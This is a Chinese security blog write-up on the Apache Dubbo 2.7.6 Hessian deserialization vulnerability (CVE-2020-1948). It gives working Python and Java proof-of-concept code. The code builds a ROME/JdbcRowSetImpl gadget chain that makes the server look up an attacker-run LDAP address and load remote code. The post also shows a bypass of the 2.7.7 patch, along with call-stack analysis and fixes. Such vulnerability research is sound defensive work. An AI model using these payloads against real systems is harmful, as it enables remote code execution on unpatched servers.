---
title: Apache Dubbo 2.7.6 反序列化漏洞复现及分析
date: 2020-07-01 19:59:26
tags: [sec,Java,deserialization]
categories: Security
---

<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>



## 简介

1. Dubbo 从大的层面上将是RPC框架，负责封装RPC调用，支持很多RPC协议

2. RPC协议包括了dubbo、rmi、hessian、webservice、http、redis、rest、thrift、memcached、jsonrpc等

3. Java中的序列化有Java原生序列化、Hessian 序列化、Json序列化、dubbo 序列化

    ![img](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/t01dd60f99ea19aec96.jpg)

图片来源：https://www.anquanke.com/post/id/209251

## 环境搭建

1. 克隆项目

    - git clone https://github.com/apache/dubbo-spring-boot-project.git
    - git checkout 2.7.6

2. 添加rome依赖

    dubbo-spring-boot-samples 文件夹，在provider-sample文件夹下的 pom 里添加

    ```
    <dependency>
        <groupId>com.rometools</groupId>
        <artifactId>rome</artifactId>
        <version>1.7.0</version>
    </dependency>
    ```

3. 启动服务端

    ```
    org.apache.dubbo.spring.boot.demo.provider.bootstrap.DubboAutoConfigurationProviderBootstrap
    ```



## 复现

### python版本

```python
# -*- coding: utf-8 -*-
# Ruilin
# pip3 install dubbo-py
from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient
 
client = DubboClient('192.168.2.1', 12345)
 
JdbcRowSetImpl=new_object(
    'com.sun.rowset.JdbcRowSetImpl',
    dataSource="ldap://192.168.2.2:1389/nnyvbt",
    strMatchColumns=["foo"]
    )
JdbcRowSetImplClass=new_object(
    'java.lang.Class',
    name="com.sun.rowset.JdbcRowSetImpl",
    )
toStringBean=new_object(
    'com.rometools.rome.feed.impl.ToStringBean',
    beanClass=JdbcRowSetImplClass,
    obj=JdbcRowSetImpl
    )
 
resp = client.send_request_and_return_response(
    service_name='any_name',
    method_name='any_method',
    args=[toStringBean])
    
print(resp)
```



### java版本

1. `DemoService`增加接口方法

    ```java
    String rceTest(Object o);
    ```

2. `DefaultDemoService`实现接口方法

    ```java
    @Override
    public String rceTest(Object o) {
        return "pwned";
    }
    ```

3. `DubboAutoConfigurationConsumerBootstrap`客户端增加调用

    ```java
    public ApplicationRunner runner() throws Exception {
        Object o = getPayload();
        return args -> logger.info(demoService.rceTest(o));
    }
    
    private static Object getPayload() throws Exception {
        String jndiUrl = "ldap://192.168.3.104:1389/sg56vh";
    
        ToStringBean bean = new ToStringBean(JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(jndiUrl));
        EqualsBean root = new EqualsBean(ToStringBean.class, bean);
    
        return JDKUtil.makeMap(root, root);
    }
    ```
    
4. 运行provider服务者，再运行consumer消费者，触发漏洞

    

流量

![image-20200629170736311](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200629170736311.png)

`0xdabb`开头的为dubbo流量，提出后可以直接用socket发送触发漏洞



## 分析

### python版本触发点

```
org.apache.dubbo.rpc.protocol.dubbo.DubboCodec.decodeBody()
org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation.decode()
org.apache.dubbo.rpc.protocol.dubbo.CallbackServiceCodec.decodeInvocationArgument()
org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol.getInvoker()
java.lang.StringBuilder.append()
java.lang.String.valueOf()
org.apache.dubbo.rpc.RpcInvocation.toString()
com.rometools.rome.feed.impl.ToStringBean.toString()
com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
com.sun.rowset.JdbcRowSetImpl.connect()
javax.naming.InitialContext.lookup()
```

python版本poc成功触发的关键点在于，通过构造一个不存在的`service_name`使得服务端获取不到期望的DubboExporter进而抛出异常，而在输出异常信息的时候进行了字符串拼接进而调用了隐含的toString方法，所以能够通过构造的恶意对象的toString方法触发漏洞

![image-20200630134254690](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200630134254690.png)

那么关键点就在异常处理部分了，也正是rui0提出的“后反序列化漏洞”的利用场景，重点来看一下

`org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol.getInvoker()`

```java
//dubbo 2.7.3
if (exporter == null) {
    throw new RemotiyicngException(channel, "Not found exported service: " + serviceKey + " in " + this.exporterMap.keySet() + ", may be version or group mismatch , channel: consumer: " + channel.getRemoteAddress() + " --> provider: " + channel.getLocalAddress() + ", message:" + inv);
} else {
    return exporter.getInvoker();
}
```

dubbo 2.7.3版本中，抛出异常部分直接拼接了inv，此时inv为`DecodeableRpcInvocation`对象，并且`arguments`值为我们设置的`ToStringBean`对象，在对其直接进行字符串拼接时会触发String.append->String.valueOf->obj.toString()，进而将`ToStringBean`进行tostring触发漏洞

而在2.7.5之后的版本中，throw RemotiyicngException部分变成了

```java
//dubbo 2.7.5
if (exporter == null) {
    throw new RemotingException(channel, "Not found exported service: " + serviceKey + " in " + this.exporterMap.keySet() + ", may be version or group mismatch , channel: consumer: " + channel.getRemoteAddress() + " --> provider: " + channel.getLocalAddress() + ", message:" + this.getInvocationWithoutData(inv));
} else {
    return exporter.getInvoker();
}
```

注意到对inv经过了`getInvocationWithoutData`处理，这个处理是这样的：

```java
//org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol
private Invocation getInvocationWithoutData(Invocation invocation) {
    if (this.logger.isDebugEnabled()) {
        return invocation;
    } else if (invocation instanceof RpcInvocation) {
        RpcInvocation rpcInvocation = (RpcInvocation)invocation;
        rpcInvocation.setArguments((Object[])null);
        return rpcInvocation;
    } else {
        return invocation;
    }
}
```

可以看到将invocation中的`arguments`值处理成了空，经过这个处理之后后续的toString利用链就无法继续下去，起到了第一层防御效果，因此通过设置`arguments`为恶意对象的方法就无法在2.7.5版本以上触发。

相关commit可以在[这里](https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346)看到



### Java版本触发点

```
org.apache.dubbo.remoting.transport.DecodeHandler.decode()
org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation.decode()
org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput.readObject()
com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject()
com.alibaba.com.caucho.hessian.io.MapDeserializer.readMap()
com.alibaba.com.caucho.hessian.io.MapDeserializer.doReadMap()
java.util.HashMap.put()->hash()->hashCode()
com.rometools.rome.feed.impl.EqualsBean.beanHashCode()
com.rometools.rome.feed.impl.ToStringBean.toString()
com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
com.sun.rowset.JdbcRowSetImpl.connect()
javax.naming.InitialContext.lookup()
```

下面讨论一下java版本poc为什么在解决了异常处理的toString后还是能触发漏洞？

除了上面的commit修复了异常处理中的toString外，官方还提交了一个[PR](https://github.com/apache/dubbo/commit/04fc3ce4cc87b9bd09546c12df3f8762b9525da9#diff-97efdee63a15983753ec52d8cd03b6a7)

![image-20200701113514058](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701113514058.png)

在`org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation.decode()`中增加了`RpcUtils.isGenericCall`和`RpcUtils.isEcho`的判断，在没有补丁之前，pts还能通过反射从desc中获取到，而打了补丁后，如果方法名不是`$invoke`或`$invokeAsync`或`$echo`则直接抛出Service not found，因此当用python版本poc发送不存在的service_name或method_name时，便通不过判断，也就无法利用。

上述判断条件是当传入的参数类别从对应的方法中获取不到的时候进行的，那么如果我们传入正确的方法名和参数类型，该条件就不成立，也就不会进入`RpcUtils.isGenericCall`和`RpcUtils.isEcho`，从而绕过了对调用的方法名的判断

![image-20200701112440804](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701112440804.png)

因此我们重新实现一下客户端代码，调用正确的服务名和方法名，并传入构造的map对象，便能再次触发漏洞。

触发条件：必须知道服务端的完整service name和方法名，同时该方法需要能接收map或object对象，客户端才能通过正确的服务名和方法名去调用，否则是无法触发的。



### 2.7.7绕过

上面分析了CVE-2020-1948，看似补丁修复了漏洞，但之后又有讨论说在2.7.7上又存在绕过，下面也来分析一下

还是看`getInvocationWithoutData`方法，注意到在设置`arguments`为空之前有这么两行代码

```java
if (this.logger.isDebugEnabled()) {
    return invocation;
}
```

这就是说如果provider是以debug模式启动的，那么会直接返回`invocation`对象。。。

配置一下服务端启动的日志级别，然后修改python版本poc的`method_name`为`$invoke`，成功绕过2.7.7补丁（还需要注意服务名是否匹配和服务版本号的问题）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration scan="true">
    <logger name="com.alibaba.dubbo" level="DEBUG"/>
</configuration>
```

![image-20200701191029066](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701191029066.png)



### 小结

上面两种触发方式是不一样的，一个是利用异常处理中存在设计不足，使得可以执行用户可控参数的toString方法，也即“后反序列化”利用思路，另一个是直接反序列化hessian2数据，期间对hashmap的操作进入toString，从调用栈上也能看出两者的区别。



## 修复方式

按照[dubbo/pull/6374](https://github.com/apache/dubbo/pull/6374)建议的方法，给`ParameterTypesDesc`加上校验，严格限制类型为`Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;`，同时建议参考[sofa-hessian](https://github.com/sofastack/sofa-hessian)给反序列化加上黑名单

![image-20200701192122667](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701192122667.png)



## 参考

- https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html
- http://rui0.cn/archives/1338
- https://www.anquanke.com/post/id/197658
- https://github.com/apache/dubbo/pull/6374

<script>pangu.spacingPage();</script>